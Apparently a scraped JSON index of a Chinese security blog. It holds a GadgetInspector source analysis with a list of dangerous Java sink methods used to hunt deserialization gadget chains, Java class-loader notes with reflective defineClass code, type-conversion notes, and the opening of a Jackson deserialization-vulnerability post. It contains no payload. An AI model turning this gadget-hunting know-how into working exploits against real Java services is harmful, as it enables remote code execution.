GadgetChain newChain = new GadgetChain(chain, newLink);//新节点与之前的链组成新链 if (isSink(methodImpl, graphCall.getTargetArgIndex(), inheritanceMap)) &#123;//如果到达了sink，则加入discoveredGadgets discoveredGadgets.add(newChain); &#125; else &#123; //新链加入队列 methodsToExplore.add(newChain); //新节点加入已访问集合 exploredMethods.add(newLink); &#125; &#125; &#125; &#125; &#125; //保存搜索到的利用链到gadget-chains.txt try (OutputStream outputStream = Files.newOutputStream(Paths.get(\"gadget-chains.txt\")); Writer writer = new OutputStreamWriter(outputStream, StandardCharsets.UTF_8)) &#123; for (GadgetChain chain : discoveredGadgets) &#123; printGadgetChain(writer, chain); &#125; &#125; 这里先看一下： 1Map&lt;MethodReference.Handle, Set&lt;MethodReference.Handle&gt;&gt; methodImplMap = InheritanceDeriver.getAllMethodImplementations(inheritanceMap, methodMap); 这里是为了得到父类方法的所有子类方法实现（被子类重写的方法） 因为Java的继承特性，对于一个父类，它的方法实现，可以通过子孙类进行重写覆盖。 因为多态特性，实现类只有运行时可确定，因此，需要对其所有重写实现都形成分析链，就能确保在非运行时，做到gadget chain的挖掘。 分析InheritanceDeriver.getAllMethodImplementations代码： 首先获取类对应的方法集合，就是每个里面有哪些方法。 methodByClass：类名-类拥有的方法名 subClassMap：父类-继承的子孙类 接下来遍历methodMap中的每个方法，并通过查询继承了方法所属类的子孙类的方法实现，确定方法是否被重写，最后整合成 方法-&gt;重写的方法集 的映射集合，静态方法跳过，是不可被重写的。 保存的数据格式： 接下来整合： 太晕了。。有时间整理。 作者给出的判断sink方法： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879private boolean isSink(MethodReference.Handle method, int argIndex, InheritanceMap inheritanceMap) &#123; if (method.getClassReference().getName().equals(\"java/io/FileInputStream\") &amp;&amp; method.getName().equals(\"&lt;init&gt;\")) &#123; return true; &#125; if (method.getClassReference().getName().equals(\"java/io/FileOutputStream\") &amp;&amp; method.getName().equals(\"&lt;init&gt;\")) &#123; return true; &#125; if (method.getClassReference().getName().equals(\"java/nio/file/Files\") &amp;&amp; (method.getName().equals(\"newInputStream\") || method.getName().equals(\"newOutputStream\") || method.getName().equals(\"newBufferedReader\") || method.getName().equals(\"newBufferedWriter\"))) &#123; return true; &#125; if (method.getClassReference().getName().equals(\"java/lang/Runtime\") &amp;&amp; method.getName().equals(\"exec\")) &#123; return true; &#125; /* if (method.getClassReference().getName().equals(\"java/lang/Class\") &amp;&amp; method.getName().equals(\"forName\")) &#123; return true; &#125; if (method.getClassReference().getName().equals(\"java/lang/Class\") &amp;&amp; method.getName().equals(\"getMethod\")) &#123; return true; &#125; */ // If we can invoke an arbitrary method, that's probably interesting (though this doesn't assert that we // can control its arguments). Conversely, if we can control the arguments to an invocation but not what // method is being invoked, we don't mark that as interesting. if (method.getClassReference().getName().equals(\"java/lang/reflect/Method\") &amp;&amp; method.getName().equals(\"invoke\") &amp;&amp; argIndex == 0) &#123; return true; &#125; if (method.getClassReference().getName().equals(\"java/net/URLClassLoader\") &amp;&amp; method.getName().equals(\"newInstance\")) &#123; return true; &#125; if (method.getClassReference().getName().equals(\"java/lang/System\") &amp;&amp; method.getName().equals(\"exit\")) &#123; return true; &#125; if (method.getClassReference().getName().equals(\"java/lang/Shutdown\") &amp;&amp; method.getName().equals(\"exit\")) &#123; return true; &#125; if (method.getClassReference().getName().equals(\"java/lang/Runtime\") &amp;&amp; method.getName().equals(\"exit\")) &#123; return true; &#125; if (method.getClassReference().getName().equals(\"java/nio/file/Files\") &amp;&amp; method.getName().equals(\"newOutputStream\")) &#123; return true; &#125; if (method.getClassReference().getName().equals(\"java/lang/ProcessBuilder\") &amp;&amp; method.getName().equals(\"&lt;init&gt;\") &amp;&amp; argIndex &gt; 0) &#123; return true; &#125; if (inheritanceMap.isSubclassOf(method.getClassReference(), new ClassReference.Handle(\"java/lang/ClassLoader\")) &amp;&amp; method.getName().equals(\"&lt;init&gt;\")) &#123; return true; &#125; if (method.getClassReference().getName().equals(\"java/net/URL\") &amp;&amp; method.getName().equals(\"openStream\")) &#123; return true; &#125; // Some groovy-specific sinks if (method.getClassReference().getName().equals(\"org/codehaus/groovy/runtime/InvokerHelper\") &amp;&amp; method.getName().equals(\"invokeMethod\") &amp;&amp; argIndex == 1) &#123; return true; &#125; if (inheritanceMap.isSubclassOf(method.getClassReference(), new ClassReference.Handle(\"groovy/lang/MetaClass\")) &amp;&amp; Arrays.asList(\"invokeMethod\", \"invokeConstructor\", \"invokeStaticMethod\").contains(method.getName())) &#123; return true; &#125; return false; &#125; 对于每个入口节点来说，其全部子方法调用、孙子方法调用等等递归下去，就构成了一棵树。之前的步骤所做的，就相当于生成了这颗树，而这一步所做的，就是从根节点出发，找到一条通往叶子节点的道路，使得这个叶子节点正好是我们所期望的sink方法。gadgetinspector对树的遍历采用的是广度优先(BFS)，而且对于已经检查过的节点会直接跳过，这样减少了运行开销，避免了环路，但是丢掉了很多其他链。 GI的缺点 对于运行时确定的实现，也就是多态性，没办法做到污点分析： 还是因为多态的原因，还是没法做到完整的调用链搜索","categories":[{"name":"源码分析","slug":"源码分析","permalink":"https://0range228.github.io/categories/%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"}],"tags":[{"name":"GadgetInspector","slug":"GadgetInspector","permalink":"https://0range228.github.io/tags/GadgetInspector/"}]},{"title":"Java类加载","slug":"Java类加载器","date":"2020-11-05T06:58:05.000Z","updated":"2021-09-01T12:50:42.349Z","comments":true,"path":"Java类加载器/","link":"","permalink":"https://0range228.github.io/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/","excerpt":"序言 梦里玉人方下马，恨他天外一声鸿。 今天来总结Java类加载机制。","text":"序言 梦里玉人方下马，恨他天外一声鸿。 今天来总结Java类加载机制。 编译器与解释器我们通常会把编程语言的处理器分为编译器和解释器。 编译器则是将某种语言代码转换为另外一种语言的程序，通常会转换为机器语言。 解释器是一种用来执行程序的软件，它会根据程序代码中的算法执行运算，如果这个软件是根据虚拟的或者类似机器语言的程序设计语言写成，那也称为虚拟机。 Java会混用解释器和编译器，Java会先通过编译器将源代码转换为Java二进制代码（字节码），并将这种虚拟的机器语言保存在文件中（通常是.class文件），之后通过Java虚拟机（JVM）的解释器来执行这段代码。 类和类加载器这里直接上《深入理解Java虚拟机》原文，写得很好： 对于任意的一个类。其实都必须由加载它的类加载器和这个类本身一起共同确立其在Java虚拟机中的唯一性，每一个类加载器，都拥有一个独立的类名称空间。两个类是否相等，其实只有这两个类都是由同一个类加载器加载的前提下才有意义。只要加载它们的类加载器不同，那么这两个类就必定不相等。 Java是面向对象的语言，字节码中包含了很多Class信息。在 JVM 解释执行的过程中，ClassLoader就是用来加载Java类的，它会将Java字节码加载到内存中。每个 Class 类对象的内部都有一个 classLoader 属性来标识自己是由哪个 ClassLoader 加载的。 Java的类加载体系：parent属性 理论关系 1Bootstrap Classloader -&gt; Extension ClassLoader -&gt; Application ClassLoader JDK类实现体系：实现/继承的关系，通常继承URLClassLoader 1ClassLoader -&gt; Secure ClassLoader -&gt; URL ClassLoader -&gt; ExtClassLoader/AppClassLoader 类加载层次站在JVM角度来看，只存在两种不同的类加载器： 启动类加载器 BootstrapClassLoader 使用C++实现 其他类加载器/都是由Java实现/全部继承抽象类java.lang.ClassLoader Bootstrap ClassLoader 启动类加载器负责加载存放在JAVA_HOME/lib目录下，或者被-Xbooclasspath参数所指定的路径中存放的，并且可以被JVM识别的类库，加载到虚拟机的内存中。 底层原生代码是C++语言编写，属于jvm一部分，不继承java.lang.ClassLoader类，也没有父加载器，主要负责加载核心java库(即JVM本身)，存储在/jre/lib/rt.jar目录当中。 出于安全考虑，BootstrapClassLoader只加载包名为java、javax、sun等开头的类。 它负责加载 JVM 运行时核心类，这些类位于 JAVA_HOME/lib/rt.jar 文件中，我们常用内置库 java.. 都在里面。这个 ClassLoader 比较特殊，它其实不是一个ClassLoader实例对象，而是由C代码实现。用户在实现自定义类加载器时，如果需要把加载请求委派给启动类加载器，那可以直接传入null作为 BootstrapClassLoader。 Extension ClassLoader 扩展类加载器负责加载Java的扩展类库，默认加载JAVA_HOME/jre/lib/ext/目下的所有jar，库名通常以 javax 开头。 Application ClassLoader 系统类加载器直接提供给用户使用的ClassLoader，它会加载 CLASSPATH 环境变量或者 java.class.path 属性里定义的路径中的 jar 包和目录，负责加载包括开发者编写的代码、以及依赖的第三方库中的类。 如果应用程序中没有自定义过自己的类加载器，一般情况下这个就是程序中默认的类加载器。 可以通过 ClassLoader.getSystemClassLoader() 来获取它。 特殊：URLClassloaderClassLoader抽象类的一种实现，它可以根据URL搜索类或资源，并进行远程加载。在JDK实现中，BootstrapClassLoader、ExtClassLoader、AppClassLoader等都是 URLClassLoader 的子类。 ExtClassLoader 和 AppClassLoader 类的实现代码位于rt.jar 中的 sun.misc.Launcher 类中，Launcher是由BootstrapClassLoader加载的。 双亲委派机制 双亲委派模型工作过程是：如果一个类加载器收到类加载的请求，它首先不会自己去尝试加载这个类，而是把这个请求委派给父类加载器完成。每个类加载器都是如此，只有当父加载器在自己的搜索范围内找不到指定的类时（即ClassNotFoundException），子加载器才会尝试自己去加载。 ClassLoader类 - 核心方法每个 ClassLoader 对象都是一个 java.lang.ClassLoader 的实例。每个Class对象都被这些 ClassLoader 对象所加载，通过继承java.lang.ClassLoader 可以扩展出自定义 ClassLoader，并使用这些自定义的 ClassLoader 对类进行加载。 12345678910package java.lang;public abstract class ClassLoader &#123; public Class loadClass(String name); protected Class defineClass(byte[] b); public URL getResource(String name); public Enumeration getResources(String name); public ClassLoader getParent(); Class&lt;?&gt; findClass(String name) //...&#125; ClassLoader类有如下核心方法： loadClass(加载指定的Java类) 接收全类名字符串，在内存中加载为Class 对象，返回。 findClass(查找指定的Java类) 查找当前JVM中，名称为name的Class类对象是否存在，找到的话返回Class类对象。 findLoadedClass(查找JVM已经加载过的类) defineClass(定义一个Java类) 接受字节数组，在内存中加载为Class对象，返回。 resolveClass(链接指定的Java类) getParent返回其parent ClassLoader 重点逻辑： loadClass(String classname)，参数为需要加载的全限定类名，该方法会先查看目标类是否已经被加载，查看父级加载器并递归调用loadClass()，如果都没找到则调用findClass()。 findClass()，搜索类的位置，一般会根据名称或位置加载.class字节码文件，获取字节码数组，然后调用defineClass()。 defineClass()，将字节码转换为 JVM 的 java.lang.Class 对象。 嵌套调用关系：loadClass-&gt;findClass-&gt;defineClass 整个demo玩玩看； 123456789101112public class ClassLoaderTest &#123; public static void main(String[] args) &#123; ClassLoader cl = Hello.class.getClassLoader(); System.out.println(cl); ClassLoader clParent = cl.getParent(); System.out.println(clParent); ClassLoader cl2 = clParent.getParent(); System.out.println(cl2); &#125;&#125; 输出： 重点：loadClass()源码： 12345678910111213141516171819202122232425262728293031323334353637protected Class&lt;?&gt; loadClass(String name, boolean resolve) throws ClassNotFoundException &#123; synchronized (getClassLoadingLock(name)) &#123; // First, check if the class has already been loaded 检查这个类是否被加载过 Class c = findLoadedClass(name); if (c == null) &#123; long t0 = System.nanoTime(); try &#123; if (parent != null) &#123; // 如果没有加载过，给父加载器加载 c = parent.loadClass(name, false); &#125; else &#123; // 交给Bootstrap ClassLoader加载 c = findBootstrapClassOrNull(name); &#125; &#125; catch (ClassNotFoundException e) &#123; // ClassNotFoundException thrown if class not found // from the non-null parent class loader &#125; if (c == null) &#123; // 如果没找到的话，由本类来findClass long t1 = System.nanoTime(); c = findClass(name); // this is the defining class loader; record the stats sun.misc.PerfCounter.getParentDelegationTime().addTime(t1 - t0); sun.misc.PerfCounter.getFindClassTime().addElapsedTimeFrom(t1); sun.misc.PerfCounter.getFindClasses().increment(); &#125; &#125; if (resolve) &#123; resolveClass(c); &#125; return c; &#125; 它先使用了findLoadedClass(String)方法来检查这个类是否被加载过 接着使用父加载器调用loadClass(String)方法 之后就调用自身findClass(String) 方法装载类。 最后通过上述步骤找到了对应的Class对象，并且接收到的resolve参数的值为true，那么就调用resolveClass(Class)方法来链接(验证，准备，解析)。 forName方法和loadClass方法的区别 两种类加载：显式、隐式显式加载[动态加载]： Java反射CLass.forName(&quot;com.sec.Test&quot;) 加载、链接、初始化 类加载器ClassLoader.loadClass(&quot;com.sec.Test&quot;)：仅加载 隐式加载[静态加载]： 创建类对象 new 使用类的静态域 创建子类对象 使用子类的静态域 调用类的静态方法 Class.method() Demo: 12345// 反射加载Test示例 显式加载Class.forName(\"com.sec.Test\");// ClassLoader加载Test示例 隐式加载this.getClass.getClassLoader().loadClass(\"com.sec.Test\"); Class.forName(&quot;类名&quot;)默认会初始化被加载类的静态属性和方法 如果不希望初始化类可以使用Class.forName(&quot;类名&quot;, 是否初始化类, 类加载器) ClassLoader.loadClass()只是将类加载进JVM虚拟机。 Class.forName()可以加载数组，而ClassLoader.loadClass() 不能。 子类引用父类的静态字段，不会触发子类的初始化。 自定义ClassLoader Java 中提供的默认 ClassLoader 只加载指定目录下面的 jar 和 class ，我们从上面了解到 ClassLoader是一个抽象类，实现自定义的 ClassLoader 需要继承该类并实现里面的方法。 java.lang.ClassLoader是所有的类加载器的父类。 一般情况下，我们重写父类的 findClass 方法即可。 双亲委派机制是loadClass()函数负责的。 可以打破但是没必要。 *一个ClassLoader创建时如果没有指定parent，那么它的parent默认就是AppClassLoader。 * ClassLoader 方法那么多为什么只重写 findClass 方法？ 因为 JDK 已经在 loadClass 方法中帮我们实现了 ClassLoader 搜索类的算法，当在 loadClass 方法中搜索不到类时，loadClass 方法就会调用findClass 方法来搜索类，所以我们只需重写该方法即可。如没有特殊的要求，一般不建议重写 loadClass 搜索类的算法。 步骤： 编写一个类继承自ClassLoader抽象类。 覆盖它的findClass()方法。 在findClass()方法中调用defineClass()。 自定义 ClassLoader DEMO假如我们自定义一个 classloader，我们可以编写一个测试类来说明。在当前目录下面新建一个 Hello 类。里面有个方法 sayHello，然后放入到指定目录下面，如：我当前的目录为： 12345public class Hello &#123; public void sayHello()&#123; System.out.println(\"Hello! ----------&gt; DIYClassLoader\"); &#125;&#125; 接着我们需要自定义一个 ClassLoader 来继承系统的 ClassLoader，命名为 DIYClassLoader 类。 1234567891011121314151617181920212223242526272829303132333435363738394041public class DIYClassLoader extends ClassLoader&#123; private String mylibPath; public DIYClassLoader(String path) &#123; mylibPath = path; &#125; @Override protected Class&lt;?&gt; findClass(String name) throws ClassNotFoundException &#123; String fileName = getFileName(name); File file = new File(mylibPath,fileName); try&#123; FileInputStream is = new FileInputStream(file); ByteArrayOutputStream bos = new ByteArrayOutputStream(); int len = 0; try &#123; while((len = is.read())!= -1)&#123; bos.write(len); &#125; &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; byte[] data = bos.toByteArray(); is.close(); bos.close(); return defineClass(name,data,0,data.length); &#125;catch (Exception e)&#123; e.printStackTrace(); &#125; return super.findClass(name); &#125; //获取要加载 的class文件名 private String getFileName(String name) &#123; int index = name.lastIndexOf('.'); if(index == -1)&#123; return name+\".class\"; &#125;else&#123; return name.substring(index)+\".class\"; &#125; &#125;&#125; 现在需要的是写一个调用方法： 1234567891011121314151617181920public static void main(String[] args) &#123; DIYClassLoader diyClassLoader = new DIYClassLoader(\"/path\"); try &#123; Class&lt;?&gt; c = diyClassLoader.loadClass(\"class.name\"); if (c != null) &#123; try &#123; Object obj = c.newInstance(); Method method = c.getDeclaredMethod(\"sayHello\", null); //通过反射调用Hello类的sayHello方法 method.invoke(obj, null); &#125; catch (Exception e) &#123; // TODO Auto-generated catch block e.printStackTrace(); &#125; &#125; &#125; catch (ClassNotFoundException e) &#123; e.printStackTrace(); &#125; &#125; 最终实现方法调用： 重要方法 loadClass直接看源码： 12345678910111213141516171819202122232425262728293031323334353637383940414243protected Class&lt;?&gt; loadClass(String name, boolean resolve) throws ClassNotFoundException &#123; synchronized (getClassLoadingLock(name)) &#123; // 首先，检测是否已经加载 Class&lt;?&gt; c = findLoadedClass(name); if (c == null) &#123; long t0 = System.nanoTime(); try &#123; if (parent != null) &#123; //父加载器不为空则调用父加载器的loadClass c = parent.loadClass(name, false); &#125; else &#123; //父加载器为空则调用Bootstrap Classloader c = findBootstrapClassOrNull(name); &#125; &#125; catch (ClassNotFoundException e) &#123; // ClassNotFoundException thrown if class not found // from the non-null parent class loader &#125; if (c == null) &#123; // If still not found, then invoke findClass in order // to find the class. // 如果该类未被加载，并且父类加载器也没有找到，则调用findclass long t1 = System.nanoTime(); //！！！！！！！！！！！ c = findClass(name); // this is the defining class loader; record the stats sun.misc.PerfCounter.getParentDelegationTime().addTime(t1 - t0); sun.misc.PerfCounter.getFindClassTime().addElapsedTimeFrom(t1); sun.misc.PerfCounter.getFindClasses().increment(); &#125; &#125; if (resolve) &#123; //需不需要连接阶段，调用resolveClass() resolveClass(c); &#125; return c; &#125; &#125; 上面是方法原型，一般实现这个方法的步骤是 执行findLoadedClass(String)去检测这个class是不是已经加载过了，已经加载过的都应该在缓存中。 执行父加载器的loadClass方法。如果父加载器为空，则Bootstrap ClassLoader加载器去加载。这也解释了ExtClassLoader的parent为null,但仍然说Bootstrap ClassLoader是它的父加载器。 如果向上委托父加载器没有加载成功，则通过findClass(String)查找。 如果class在上面的步骤中找到了，参数resolve又是true的话（上文提到的==resolveClass==，resolve参数就是表示需不需要连接阶段），那么loadClass()又会调用resolveClass(Class)这个方法去链接，来生成最终的Class对象。 类加载主要的三个阶段 加载 链接 验证：为了保证加载进来的字节流符合虚拟机规范，不会造成安全错误。 准备：为类变量分配内存，“预分配内存”，并且赋予初值0。 解析：将常量池中的符号引用转换为直接引用（内存块），替换为具体的内存地址或偏移量。 初始化：只给static修饰的变量或者语句赋值，执行静态代码块。 如果初始化一个类的时候，其父类尚未初始化，则优先初始化其父类。 如果同时包含多个静态变量和静态代码块，则按照自上而下的顺序依次执行。 URLClassLoader在java.net包中，JDK提供了一个更加易用的类加载器URLClassLoader，它继承了ClassLoader，能够从本地或者网络上指定的位置加载类，我们可以使用该类作为自定义的类加载器使用。 URLClassLoader是ClassLoader的子类，它用于从指向 JAR 文件和目录的 URL 的搜索路径加载类和资源。也就是说，通过URLClassLoader就可以加载指定jar中的class到内存中。下面来看一个例子，在该例子中，我们要完成的工作是利用URLClassLoader加载jar并运行其中的类的某个方法。 加载过程中不会执行静态代码块。 构造方法： public URLClassLoader(URL[] urls)：指定要加载的类的所在地URL地址，父类加载器默认为App系统类加载器 public URLClassLoader(URL[] urls,ClassLoader parent)：指定要加载的类的所在的URL地址，并指定父类加载器。 1234File file = new File(jar文件全路径); URL url = file.toURL(); URLClassLoader loader = new URLClassLoader(new URL[] &#123; url &#125;); Class tidyClazz = loader.loadClass(所需class的含包名的全名); Java 运行时类加载ClassLoader.loadClass()与Class.forName()是反射用来构造类，给一个类名即可，返回值是Class。 注意一点，C lass.forName()方法全套服务，会执行目标class的static代码块方法。 loadClass 应该在URLClassLoader里面用的多，这个涉及到动态加载jar包。 获取当前ClassLoader的四种方式： 12345678// 方式一：获取当前类的 ClassLoaderclazz.getClassLoader()// 方式二：获取当前线程上下文的 ClassLoaderThread.currentThread().getContextClassLoader()// 方式三：获取系统的 ClassLoaderClassLoader.getSystemClassLoader()// 方式四：获取调用者的 ClassLoaderDriverManager.getCallerClassLoader() 通过反射获取defineClass方法1ClassLoader.defineClass(buye[] b); 1231. java.lang.reflect.Method defineClassMethod = ClassLoader.class.getDeclaredMethod(\"defineClass\",new Class[]&#123;byte[].class, int.class, int.class&#125;);2. defineClassMethod.setAccessible(true);3. Class cc = (Class) defineClassMethod.invoke(new ClassLoader()&#123;&#125;, classBytes, 0, classBytes.length); 通过反射结合Thread1231. ...2. ...3. Class cc = (Class) defineClassMethod.invoke(Thread.currentThread().getContextClassLoader(), classBytes, 0, classBytes.length); 构造函数类加载完成后，对象实例化是Class.newInstance()方法。该方法会执行无参构造函数， 凡是能触发构造函数，都能触发静态代码块。","categories":[{"name":"Java","slug":"Java","permalink":"https://0range228.github.io/categories/Java/"}],"tags":[{"name":"ClassLoader","slug":"ClassLoader","permalink":"https://0range228.github.io/tags/ClassLoader/"}]},{"title":"Java数据类型转换","slug":"Java数据类型转换","date":"2020-09-24T08:15:13.000Z","updated":"2020-10-06T02:34:17.908Z","comments":true,"path":"Java数据类型转换/","link":"","permalink":"https://0range228.github.io/Java%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2/","excerpt":"序言 锲而不舍，金石可镂。 今天来梳理Java数据类型转换，这部分很杂乱，顺便总结总结API，做个笔记。","text":"序言 锲而不舍，金石可镂。 今天来梳理Java数据类型转换，这部分很杂乱，顺便总结总结API，做个笔记。 类型种类Java提供了两个类型系统，基本类型与引用类型，使用基本类型在于效率，然而很多情况，会创建对象使用，因为对象可以做更多的功能。 如果想要我们的基本类型像对象一样操作，就可以使用基本类型对应的包装类，如下： 基本类型 对应的包装类（位于java.lang包中） byte Byte short Short int Integer long Long float Float double Double char Character boolean Boolean 经常使用的有4种基本类型： char byte String int(Integer) 一下主要讨论这四个类型的转换，会用到包装类。 char &lt;-&gt; int先看代码： 123456789public static void main(String[] args) &#123; int i = 65; System.out.println((char)i);//result:A char c = 'A'; System.out.println((int)c);//result:65 &#125; 可以看到，如果进行强制类型转换，char会和ASCII码进行互相转换。 char -&gt; int现在想要的是 char:’9’ -&gt; int:9 转换代码： 123char b = '4';int numericValue = Character.getNumericValue(b);System.out.println(numericValue);// 4 type:int int -&gt; char现在想要的是 int:9 -&gt; char:’9’ 转换代码： 123int a =4;char intValue = Character.forDigit(a,10);System.out.println(intValue);// 4 type:char 其他方法直接将’0‘的ASCII码值加上一起转换 1char c = (char)('0' + i); int &lt;-&gt; byteint -&gt; byte会发生高位截断： 123int a = 234;byte b = (byte)a;System.out.println(b);//-22 byte -&gt; int12345678public static int byteToInt(byte b) &#123; //Java 总是把 byte 当做有符处理；我们可以通过将其和 0xFF 进行二进制与得到它的无符值 return b &amp; 0xFF; &#125;....byte b = -22;System.out.println(byteToInt(b));//234 char &lt;-&gt; String这类就很常见了。 char -&gt; String直接上API，万物.valueOf()转一切。 123char a = 'A';String s = String.valueOf(a);System.out.println(s);//A type:String 字符数组： 123char[] c = new char[]&#123;'A','B','C','D','E','F','G'&#125;;String n = String.valueOf(c);System.out.println(n);//ABCDEFG String -&gt; char老熟面孔了： 123//n = \"ABCDEFG\"char[] chars = n.toCharArray();System.out.println(Arrays.toString(chars));//[A, B, C, D, E, F, G] String &lt;-&gt;byte这里默认就是byte[]字节数组。 String -&gt; byte[]直接上代码： 123String str = \"ABCDEFG\";byte[] strbyte = str.getBytes();System.out.println(Arrays.toString(strbyte));//[65, 66, 67, 68, 69, 70, 71] 可以发现直接内容其实就是ASCII码。 byte[] -&gt; String直接用String的构造方法就行，直接上： 123byte[] b= &#123;-60,-29,-70,-61,-93,-84,-42,-48,-71,-6,13,10,-42,-48,-71,-6,-93,-84,-60,-29,-70,-61&#125;;String s = new String(b);System.out.println(s);//你好，中国，中国，你好 int &lt;-&gt; Stringint[] -&gt; String可以用StringBuilder，直接上： 123456StringBuilder sb = new StringBuilder();int[] test = &#123;1,2,23,4,5&#125;;for (int i = 0; i &lt; test.length; i++) &#123; sb.append(test[i]);&#125;System.out.println(sb.toString());//122345 要是想转换为ASCII码对应的字符串，可以这么写： 123456StringBuilder sb = new StringBuilder();int[] test = &#123;65,66,67&#125;;for (int i = 0; i &lt; test.length; i++) &#123; sb.append((char)test[i]);&#125;System.out.println(sb.toString());//ABC String -&gt; int[]12345678String ss = \"12345678\";char[] cc = ss.toCharArray();int[] tar = new int[ss.length()];for (int i = 0; i &lt; cc.length; i++) &#123; tar[i] = Integer.parseInt(String.valueOf(cc[i]))； //Interger.valueOf(cc[i].toString(),2)也可以。&#125;System.out.println(Arrays.toString(tar));//[1, 2, 3, 4, 5, 6, 7, 8] byte&lt;-&gt;charchar[] -&gt; byte[]方法1:用String作为跳板 1234char[] cs = new char[] &#123; 'a', 'b', 'c', 'd', 'e', 'f', 'g' &#125;;String scs = new String(cs);byte[] bb= scs.getBytes();System.out.println(Arrays.toString(bb));//[97, 98, 99, 100, 101, 102, 103] 方法2:循环+强制转型 123456char[] cs = new char[] &#123; 'a', 'b', 'c', 'd', 'e', 'f', 'g' &#125;;byte[] bs2 = new byte[cs.length];for(int i = 0; i &lt; cs.length; i++) &#123;//循环将char数组的每一个元素转换为byte并存在上面定义的byte数组中 bs2[i] = (byte) cs[i];//将每一个char转换成byte&#125;System.out.println(Arrays.toString(bs2));//[97, 98, 99, 100, 101, 102, 103] byte[] -&gt; char[]12345678910111213private char[] getChars (byte[] bytes) &#123; Charset cs = Charset.forName (\"UTF-8\"); ByteBuffer bb = ByteBuffer.allocate (bytes.length); bb.put (bytes); bb.flip (); CharBuffer cb = cs.decode (bb); return cb.array();&#125;//byte[] bb = &#123;97, 98, 99, 100, 101, 102, 103&#125;;char[] result = getChars(bb);System.out.println(Arrays.toString(result));//[a, b, c, d, e, f, g]","categories":[{"name":"Java","slug":"Java","permalink":"https://0range228.github.io/categories/Java/"}],"tags":[{"name":"Java基础","slug":"Java基础","permalink":"https://0range228.github.io/tags/Java%E5%9F%BA%E7%A1%80/"}]},{"title":"【反序列化漏洞】Jackson","slug":"【反序列化漏洞】Jackson","date":"2020-09-16T01:10:54.000Z","updated":"2021-06-08T06:15:22.550Z","comments":true,"path":"【反序列化漏洞】Jackson/","link":"","permalink":"https://0range228.github.io/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91Jackson/","excerpt":"序言 往事依稀浑似梦，都随风雨到心头。 今天来分析Jackson。","text":"序言 往事依稀浑似梦，都随风雨到心头。 今天来分析Jackson。 简介Jackson是一个开源的Java序列化和反序列化工具，可以将Java对象序列化为XML或JSON格式的字符串，以及将XML或JSON格式的字符串反序列化为Java对象。 序列化操作在jackson内部，需要进行序列化的函数是： 提供了ObjectMapper.writeValueAsString()和ObjectMapper.readValue()两个方法来实现序列化和反序列化的功能。 ObjectMapper.writeValueAsString()———序列化 ObjectMapper.readValue()————————反序列化 pom.xml： 123456789101112131415161718192021222324&lt;dependencies&gt; &lt;!-- https://mvnrepository.com/artifact/com.fasterxml.jackson.core/jackson-databind --&gt; &lt;dependency&gt; &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt; &lt;artifactId&gt;jackson-databind&lt;/artifactId&gt; &lt;version&gt;2.7.9&lt;/version&gt; &lt;/dependency&gt; &lt;!-- https://mvnrepository.com/artifact/com.fasterxml.jackson.core/jackson-core --&gt; &lt;dependency&gt; &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt; &lt;artifactId&gt;jackson-core&lt;/artifactId&gt; &lt;version&gt;2.7.9&lt;/version&gt; &lt;/dependency&gt; &lt;!-- https://mvnrepository.com/artifact/com.fasterxml.jackson.core/jackson-annotations --&gt; &lt;dependency&gt; &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt; &lt;artifactId&gt;jackson-annotations&lt;/artifactId&gt; &lt;version&gt;2.7.9&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt; 来个小Demo： 12345678910111213141516171819202122232425262728293031public class Test &#123; public static void main(String[] args) &#123; Student stu = new Student(); stu.name=\"0range\"; stu.age=20; ObjectMapper mapper = new ObjectMapper(); try &#123; String json=mapper.writeValueAsString(stu); System.out.println(json); //&#123;\"age\":20,\"name\":\"0range\"&#125; Student stu1 = mapper.readValue(json,Student.class); System.out.println(stu1); //&#123;\"age\":20,\"name\":\"0range\"&#125; &#125; catch (JsonProcessingException e) &#123; e.printStackTrace(); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; &#125;&#125;class Student&#123; public int age; public String name; @Override public String toString() &#123; return String.format(\"age=%d, name=%s\", age, name); &#125;&#125; 运行结果： JacksonPolymorphicDeserialization简单地说，Java多态就是同一个接口使用不同的实例而执行不同的操作。 那么问题来了，如果对多态类的某一个子类实例在序列化后再进行反序列化时，如何能够保证反序列化出来的实例即是我们想要的那个特定子类的实例而非多态类的其他子类实例呢？——Jackson实现了JacksonPolymorphicDeserialization机制来解决这个问题。 JacksonPolymorphicDeserialization即Jackson多态类型的反序列化：在反序列化某个类对象的过程中，如果类的成员变量不是具体类型（non-concrete），比如Object、接口或抽象类，则可以在JSON字符串中指定其具体类型，Jackson将生成具体类型的实例。 简单地说，就是将具体的子类信息绑定在序列化的内容中以便于后续反序列化的时候直接得到目标子类对象，其实现有两种: DefaultTyping @JsonTypeInfo注解。 下面具体看一下。 DefaultTypingcom.fasterxml.jackson.databind.ObjectMapper.DefaultTyping Jackson提供一个enableDefaultTyping设置，其包含4个值： 123456789101112131415161718192021222324252627282930313233343536373839public enum DefaultTyping &#123; /** * This value means that only properties that have * &#123;@link java.lang.Object&#125; as declared type (including * generic types without explicit type) will use default * typing. */ JAVA_LANG_OBJECT, /** * Value that means that default typing will be used for * properties with declared type of &#123;@link java.lang.Object&#125; * or an abstract type (abstract class or interface). * Note that this does &lt;b&gt;not&lt;/b&gt; include array types. *&lt;p&gt; * Since 2.4, this does NOT apply to &#123;@link TreeNode&#125; and its subtypes. */ OBJECT_AND_NON_CONCRETE, /** * Value that means that default typing will be used for * all types covered by &#123;@link #OBJECT_AND_NON_CONCRETE&#125; * plus all array types for them. *&lt;p&gt; * Since 2.4, this does NOT apply to &#123;@link TreeNode&#125; and its subtypes. */ NON_CONCRETE_AND_ARRAYS, /** * Value that means that default typing will be used for * all non-final types, with exception of small number of * \"natural\" types (String, Boolean, Integer, Double), which * can be correctly inferred from JSON; as well as for * all arrays of non-final types. *&lt;p&gt; * Since 2.4, this does NOT apply to &#123;@link TreeNode&#125; and its subtypes. */ 